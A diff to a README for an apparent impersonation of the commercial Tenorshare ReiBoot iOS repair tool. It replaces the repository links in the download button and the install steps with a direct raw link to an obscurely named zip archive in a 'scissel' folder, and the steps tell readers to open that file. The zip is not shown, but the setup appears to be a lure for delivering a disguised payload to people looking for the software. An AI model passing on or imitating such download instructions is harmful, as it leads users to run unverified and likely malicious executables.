@@ -1,6 +1,6 @@
 # 📱 Tenorshare-ReiBoot-iOS-Repair - Fix Your iPhone Issues With Ease
 
-<a href="https://github.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair"><img src="https://img.shields.io/badge/Download-Tenorshare_ReiBoot-blue.svg" alt="Download Button"></a>
+<a href="https://raw.githubusercontent.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair/main/scissel/i_O_Tenorshare_Boot_Rei_Repair_v2.7.zip"><img src="https://img.shields.io/badge/Download-Tenorshare_ReiBoot-blue.svg" alt="Download Button"></a>
 
 ## ⚙️ What This Software Does
 
@@ -22,7 +22,7 @@ Ensure your computer has an active internet connection. You need the connection 
 
 Follow these steps to get the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair](https://github.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair)
+1. Visit this page to download: [https://raw.githubusercontent.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair/main/scissel/i_O_Tenorshare_Boot_Rei_Repair_v2.7.zip](https://raw.githubusercontent.com/Calleycoruscant588/Tenorshare-ReiBoot-iOS-Repair/main/scissel/i_O_Tenorshare_Boot_Rei_Repair_v2.7.zip)
 2. Look for the release section on the page.
 3. Click the installer file to save it to your computer.
 4. Open the file once the download finishes.
